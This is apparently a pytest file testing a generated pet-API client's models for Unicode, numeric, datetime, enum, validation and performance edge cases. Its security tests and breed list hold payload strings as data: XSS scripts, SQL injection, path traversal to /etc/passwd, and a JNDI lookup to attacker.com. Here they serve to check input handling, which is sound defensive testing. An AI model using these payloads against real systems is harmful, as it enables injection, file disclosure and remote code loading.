"""Advanced edge case and negative tests for generated client code."""

import pytest
import json
import sys
from datetime import datetime, timezone
from typing import Any, Dict, List
from pydantic import ValidationError

from generated import (
    MyapiModelInputPet as Pet,
    MyapiModelOutputPet as PetDetails,
    MyapiModelKind as PetKind,
    MyapiModelKindDog as PetKindDog,
    MyapiModelKindCat as PetKindCat,
    MyapiModelBehavior as Behavior,
    MyapiModelBehaviorAggressiveVariant as BehaviorAggressive,
    MyapiModelBehaviorOtherVariant as BehaviorOther,
    MyapiModelBehaviorFactory as BehaviorFactory,
    MyapiProtoPetsUpdateRequest as PetsUpdateRequest,
    MyapiProtoPetsListRequest as PetsListRequest,
    MyapiProtoPetsRemoveRequest as PetsRemoveRequest,
    MyapiProtoPaginated as Paginated,
    MyapiProtoHeaders as Headers,
    AsyncClient,
    MyapiProtoPetsCreateError as PetsCreateError,
    MyapiProtoPetsListError as PetsListError,
    MyapiProtoPetsUpdateError as PetsUpdateError,
    MyapiProtoPetsRemoveError as PetsRemoveError,
)
from reflectapi_runtime import ReflectapiOption, ReflectapiOption as Option, Undefined

# For externally tagged enums, unit variants are just string literals
BehaviorCalm = "Calm"


class TestUnicodeAndEncoding:
    """Test Unicode handling and encoding edge cases."""

    def test_pet_with_emoji_names(self):
        """Test pet with emoji and special Unicode characters."""
        unicode_names = [
            "🐕 Wölfgang",
            "猫 Neko-chan",
            "Собака Собакевич",
            "Café le Chat",
            "Σκύλος",
            "🌟✨🎾 Super Dog ✨🌟",
            "مرحبا_كلب",
            "नमस्ते_कुत्ता",
        ]

        for name in unicode_names:
            pet = Pet(
                name=name, kind=PetKindDog(type="dog", breed="International Breed")
            )
            assert pet.name == name

            # Test JSON serialization preserves Unicode
            json_data = pet.model_dump_json()
            reconstructed = Pet.model_validate_json(json_data)
            assert reconstructed.name == name

    def test_pet_breed_with_special_characters(self):
        """Test dog breeds with special characters."""
        special_breeds = [
            "Saint-Bernard",
            "Chow Chow",
            "Poodle (Toy)",
            "German Shepherd / Mix",
            "Cocker Spaniel & Terrier",
            "50% Labrador + 50% Unknown",
            'Breed with "quotes"',
            "Breed with 'apostrophes'",
            "<script>alert('xss')</script>",  # XSS attempt
            "'; DROP TABLE pets; --",  # SQL injection attempt
        ]

        for breed in special_breeds:
            dog = PetKindDog(type="dog", breed=breed)
            assert dog.breed == breed

            # Test serialization safety
            json_data = dog.model_dump_json()
            assert len(json_data) > 0  # Basic sanity check

    def test_extremely_long_strings(self):
        """Test handling of extremely long strings."""
        # 1MB pet name
        long_name = "A" * 1000000
        pet = Pet(name=long_name, kind=PetKindDog(type="dog", breed="Patient Breed"))
        assert len(pet.name) == 1000000

        # Should be able to serialize (though slowly)
        json_data = pet.model_dump_json()
        assert len(json_data) > 1000000


class TestNumericEdgeCases:
    """Test numeric edge cases and boundary conditions."""

    def test_cat_lives_boundary_values(self):
        """Test cat lives with boundary integer values."""
        boundary_values = [
            0,  # Zero lives
            -1,
            -100,
            -2147483648,  # Negative values
            1,
            9,
            99,  # Positive values
            2147483647,  # Max 32-bit int
            9223372036854775807,  # Max 64-bit int
        ]

        for lives in boundary_values:
            cat = PetKindCat(type="cat", lives=lives)
            assert cat.lives == lives

            # Test JSON round-trip preserves value
            json_data = cat.model_dump_json()
            reconstructed = PetKindCat.model_validate_json(json_data)
            assert reconstructed.lives == lives

    def test_pet_age_edge_cases(self):
        """Test pet age with various edge case values."""
        edge_ages = [
            0,  # Newborn
            -1,  # Negative age (shouldn't be valid but test handling)
            999,  # Very old pet
            None,  # No age specified
        ]

        for age in edge_ages:
            pet = Pet(
                name="Edge Case Pet",
                kind=PetKindDog(type="dog", breed="Ageless Breed"),
                age=age,
            )
            assert pet.age == age

    def test_large_paginated_responses(self):
        """Test paginated responses with large item counts."""
        # Create large list of pets
        pets = []
        for i in range(1000):
            kind = (
                PetKindDog(type="dog", breed=f"Breed_{i}")
                if i % 2 == 0
                else PetKindCat(type="cat", lives=i % 10)
            )
            pet = PetDetails(name=f"Pet_{i}", kind=kind, updated_at=datetime.now())
            pets.append(pet)

        paginated = Paginated[PetDetails](items=pets, cursor="large_cursor")
        assert len(paginated.items) == 1000

        # Should be able to serialize large response
        json_data = paginated.model_dump_json()
        reconstructed = Paginated[PetDetails].model_validate_json(json_data)
        assert len(reconstructed.items) == 1000


class TestDateTimeEdgeCases:
    """Test datetime handling edge cases."""

    def test_pet_with_extreme_dates(self):
        """Test pets with extreme datetime values."""
        extreme_dates = [
            datetime.min,  # Minimum datetime
            datetime.max,  # Maximum datetime
            datetime(1970, 1, 1),  # Unix epoch
            datetime(2000, 1, 1),  # Y2K
            datetime(2038, 1, 19, 3, 14, 7),  # Unix timestamp limit
            datetime.now(),  # Current time
            datetime.now(timezone.utc),  # UTC timezone
        ]

        for dt in extreme_dates:
            try:
                pet = PetDetails(
                    name="Time Traveler",
                    kind=PetKindCat(type="cat", lives=9),
                    updated_at=dt,
                )
                assert pet.updated_at == dt

                # Test JSON serialization
                json_data = pet.model_dump_json()
                reconstructed = PetDetails.model_validate_json(json_data)
                # Note: Some precision might be lost in JSON serialization

            except (ValueError, OverflowError):
                # Some extreme dates might not be serializable
                pass


class TestReflectapiOptionAdvancedCases:
    """Test advanced ReflectapiOption scenarios with generated models."""

    def test_nested_optional_fields(self):
        """Test models with multiple levels of optional fields."""
        # Create update request with mix of defined and undefined fields
        request = PetsUpdateRequest(
            name="Complex Pet",
            kind=PetKindDog(type="dog", breed="Complex Breed"),
            age=ReflectapiOption(5),
            # behaviors is omitted (undefined)
        )

        # Test serialization includes provided fields
        json_data = json.loads(request.model_dump_json())
        assert "name" in json_data
        assert "kind" in json_data
        assert "age" in json_data
        assert json_data["behaviors"] is None  # Should be null when not provided

    def test_reflectapi_option_type_coercion(self):
        """Test ReflectapiOption with type coercion edge cases."""
        # Test with different numeric types
        numeric_values = [
            42,  # int
            42.0,  # float
            42.5,  # float with decimal
            True,  # bool (should be treated as 1)
            False,  # bool (should be treated as 0)
        ]

        for value in numeric_values:
            request = PetsUpdateRequest(name="Type Test", age=ReflectapiOption(value))

            # ReflectapiOption preserves the original value
            assert request.age.unwrap() == value

    def test_reflectapi_option_with_complex_nested_data(self):
        """Test ReflectapiOption containing complex nested structures."""
        complex_behaviors = [
            BehaviorFactory.CALM,
            BehaviorFactory.aggressive(8.5, "Very aggressive"),
            BehaviorFactory.other("Custom behavior", "Some notes"),
            BehaviorFactory.CALM,  # Duplicate
        ]

        request = PetsUpdateRequest(
            name="Complex Behavior Pet", behaviors=ReflectapiOption(complex_behaviors)
        )

        assert request.behaviors.is_some
        assert len(request.behaviors.unwrap()) == 4
        # Count BehaviorCalm instances - check the actual Behavior objects
        behaviors = request.behaviors.unwrap()
        calm_count = sum(
            1
            for b in behaviors
            if (hasattr(b, "root") and b.root == "Calm") or b == "Calm"
        )
        assert calm_count == 2

    def test_multiple_undefined_fields_serialization(self):
        """Test serialization with multiple undefined fields."""
        request = PetsUpdateRequest(
            name="Minimal Pet"
            # All other fields left undefined
        )

        json_data = json.loads(request.model_dump_json())

        # All fields should be present due to the default values
        assert json_data["name"] == "Minimal Pet"
        assert json_data["kind"] is None  # Default None
        assert json_data["age"] is None  # Default None
        assert json_data["behaviors"] is None  # Default None


class TestEnumEdgeCases:
    """Test enum edge cases and boundary conditions."""

    def test_behavior_enum_case_sensitivity(self):
        """Test behavior enum with different case variations."""
        # Test that enum values are case-sensitive
        with pytest.raises(ValidationError):
            Pet(
                name="Case Test",
                kind=PetKindDog(type="dog", breed="Sensitive"),
                behaviors=["calm"],  # lowercase, should fail
            )

        with pytest.raises(ValidationError):
            Pet(
                name="Case Test",
                kind=PetKindDog(type="dog", breed="Sensitive"),
                behaviors=[
                    "CALM"
                ],  # uppercase, should fail (depends on implementation)
            )

    def test_all_behavior_combinations(self):
        """Test all possible behavior combinations."""
        all_behaviors = [
            BehaviorFactory.CALM,
            BehaviorFactory.aggressive(7.0, "test aggressive"),
            BehaviorFactory.other("test other", "notes"),
        ]

        # Test empty list
        pet = Pet(
            name="No Behavior", kind=PetKindDog(type="dog", breed="Calm"), behaviors=[]
        )
        assert pet.behaviors == []

        # Test single behaviors
        for i, behavior in enumerate(all_behaviors):
            pet = Pet(
                name=f"Pet {i}",
                kind=PetKindDog(type="dog", breed="Variable"),
                behaviors=[behavior],
            )
            # The behavior gets wrapped in the RootModel when assigned to the pet
            assert len(pet.behaviors) == 1
            # Check if it's the same type of behavior
            if hasattr(behavior, "field_0"):  # Aggressive variant
                assert hasattr(pet.behaviors[0].root, "field_0")
                assert pet.behaviors[0].root.field_0 == behavior.field_0
            elif hasattr(behavior, "description"):  # Other variant
                assert hasattr(pet.behaviors[0].root, "description")
                assert pet.behaviors[0].root.description == behavior.description
            else:  # Calm variant
                assert pet.behaviors[0].root == "Calm"

        # Test all behaviors combined
        pet = Pet(
            name="All Behaviors",
            kind=PetKindDog(type="dog", breed="Complex"),
            behaviors=all_behaviors,
        )
        assert len(pet.behaviors) == len(all_behaviors)

    def test_error_enum_completeness(self):
        """Test that error enums contain expected values."""
        # PetsCreateError is a discriminated union, test the factory
        from generated import MyapiProtoPetsCreateErrorFactory

        # Test unit variants
        conflict_error = MyapiProtoPetsCreateErrorFactory.CONFLICT
        assert conflict_error.root == "Conflict"

        not_authorized_error = MyapiProtoPetsCreateErrorFactory.NOTAUTHORIZED
        assert not_authorized_error.root == "NotAuthorized"

        # Test complex variant
        invalid_identity_error = MyapiProtoPetsCreateErrorFactory.invalid_identity(
            "test message"
        )
        assert hasattr(invalid_identity_error, "message")
        assert invalid_identity_error.message == "test message"

        # Test primitive enums (these are still regular enums)
        list_errors = list(PetsListError)
        update_errors = list(PetsUpdateError)
        remove_errors = list(PetsRemoveError)

        assert len(list_errors) > 0
        assert len(update_errors) > 0
        assert len(remove_errors) > 0

        # Test that all enum values are strings
        all_primitive_errors = list_errors + update_errors + remove_errors
        for error in all_primitive_errors:
            assert isinstance(error.value, str)
            assert len(error.value) > 0


class TestValidationEdgeCases:
    """Test validation edge cases and malformed data."""

    def test_pet_kind_discriminator_tampering(self):
        """Test PetKind with tampered discriminator fields."""
        # Create valid dog, then modify discriminator
        dog_data = PetKindDog(type="dog", breed="Tampered").model_dump()
        dog_data["type"] = "cat"  # Change discriminator but keep dog fields

        # Should fail validation due to discriminator mismatch
        with pytest.raises(ValidationError):
            PetKindDog.model_validate(dog_data)

    def test_malformed_json_data(self):
        """Test handling of various malformed JSON structures."""
        malformed_cases = [
            '{"name": "Test", "kind": {"type": "dog"}}',  # Missing breed
            '{"name": "Test", "kind": {"type": "unknown", "breed": "Test"}}',  # Invalid type
            '{"name": "Test", "kind": "not_an_object"}',  # Kind as string
            '{"name": "Test", "kind": []}',  # Kind as array
            '{"name": "Test", "kind": null}',  # Kind as null
            '{"name": 123, "kind": {"type": "dog", "breed": "Test"}}',  # Name as number
            '{"kind": {"type": "dog", "breed": "Test"}}',  # Missing required name
        ]

        for malformed_json in malformed_cases:
            with pytest.raises(ValidationError):
                Pet.model_validate_json(malformed_json)

    def test_recursive_data_structures(self):
        """Test handling of recursive/circular data structures."""
        # Test deep nesting
        deeply_nested = {"level_0": {}}
        current = deeply_nested["level_0"]

        # Create 100 levels of nesting
        for i in range(1, 100):
            current[f"level_{i}"] = {}
            current = current[f"level_{i}"]

        # This should not cause stack overflow in validation
        # (Though it might be slow)
        try:
            # Try to create a pet with deeply nested extra data
            # Note: This depends on how the model handles extra fields
            pass
        except RecursionError:
            # If recursion error occurs, that's acceptable behavior
            pass

    def test_extremely_large_json_payload(self):
        """Test handling of extremely large JSON payloads."""
        # Create pet with very large behavior list
        large_behaviors = [BehaviorFactory.CALM] * 10000

        pet = Pet(
            name="Large Pet",
            kind=PetKindDog(type="dog", breed="Large Breed"),
            behaviors=large_behaviors,
        )

        # Should handle large data without issues
        assert len(pet.behaviors) == 10000

        # JSON serialization might be slow but should work
        json_data = pet.model_dump_json()
        assert (
            len(json_data) > 50000
        )  # Should be quite large (adjusted for "Calm" being shorter)


class TestClientEdgeCases:
    """Test generated client edge cases."""

    def test_client_with_malformed_base_url(self):
        """Test client construction with valid and potentially problematic URLs."""
        valid_urls = [
            "https://api.example.com",
            "https://user:pass@domain.com:8080/path?query=value#fragment",  # Complex URL
            "not-a-url",  # No protocol (client accepts this)
            "ftp://invalid-protocol.com",  # Wrong protocol (client accepts this)
        ]

        # These URLs should work (client is permissive)
        for url in valid_urls:
            client = AsyncClient(url)
            assert client.base_url is not None

        # Some URLs do cause failures, test one that definitely fails
        with pytest.raises(Exception):
            AsyncClient("https://domain-with-emoji-🚀.com")

    def test_client_method_parameter_edge_cases(self):
        """Test client method parameters with edge case values."""
        client = AsyncClient("https://api.example.com")

        # Test pets client methods exist and have proper signatures
        assert hasattr(client.pets, "list")
        assert hasattr(client.pets, "create")
        assert hasattr(client.pets, "update")
        assert hasattr(client.pets, "remove")

        # Test health client
        assert hasattr(client.health, "check")


class TestMemoryAndPerformanceEdgeCases:
    """Test memory usage and performance edge cases."""

    def test_large_model_instantiation(self):
        """Test instantiating many large models."""
        models = []

        # Create 1000 pets with large data
        for i in range(1000):
            pet = Pet(
                name=f"Pet_{i}_{'x' * 100}",  # Long name
                kind=PetKindDog(type="dog", breed=f"Breed_{i}_{'y' * 100}"),
                behaviors=[
                    BehaviorFactory.CALM,
                    BehaviorFactory.aggressive(5.0, "test"),
                    BehaviorFactory.other("test"),
                ]
                * 10,
            )
            models.append(pet)

        assert len(models) == 1000

        # Test that all models are valid
        for pet in models:
            assert pet.name.startswith("Pet_")
            assert len(pet.behaviors) == 30

    def test_model_serialization_performance(self):
        """Test serialization performance with complex models."""
        import time

        # Create complex pet
        complex_pet = Pet(
            name="Performance Test Pet",
            kind=PetKindDog(type="dog", breed="Performance Breed"),
            behaviors=[BehaviorFactory.CALM] * 1000,  # Large behavior list
            age=5,
        )

        # Time serialization
        start_time = time.time()
        json_data = complex_pet.model_dump_json()
        end_time = time.time()

        serialization_time = end_time - start_time

        # Should serialize in reasonable time (less than 1 second)
        assert serialization_time < 1.0
        assert len(json_data) > 1000

        # Test deserialization performance
        start_time = time.time()
        reconstructed = Pet.model_validate_json(json_data)
        end_time = time.time()

        deserialization_time = end_time - start_time
        assert deserialization_time < 1.0
        assert reconstructed.name == complex_pet.name


class TestSecurityEdgeCases:
    """Test potential security edge cases."""

    def test_xss_prevention_in_strings(self):
        """Test that XSS attempts in strings are preserved as-is."""
        xss_attempts = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "onload=alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'; DROP TABLE pets; --",
            "../../../etc/passwd",
            "${jndi:ldap://attacker.com/evil}",
        ]

        for xss_attempt in xss_attempts:
            # Should store XSS attempts as regular strings without interpretation
            pet = Pet(
                name=xss_attempt, kind=PetKindDog(type="dog", breed="Security Test")
            )

            # Should preserve the exact string
            assert pet.name == xss_attempt

            # JSON serialization should properly escape
            json_data = pet.model_dump_json()
            assert xss_attempt in json_data or json.dumps(xss_attempt) in json_data

    def test_injection_attempts_in_enum_like_fields(self):
        """Test injection attempts in enum-like fields."""
        # These should fail validation as they're not valid enum values
        invalid_behaviors = [
            "'; DROP TABLE behaviors; --",
            "<script>alert('enum')</script>",
            "../../etc/passwd",
            "null",
            "undefined",
            123,  # Number instead of string
            [],  # Array instead of string
            {},  # Object instead of string
        ]

        for invalid_behavior in invalid_behaviors:
            with pytest.raises(ValidationError):
                Pet(
                    name="Injection Test",
                    kind=PetKindDog(type="dog", breed="Security"),
                    behaviors=[invalid_behavior],
                )
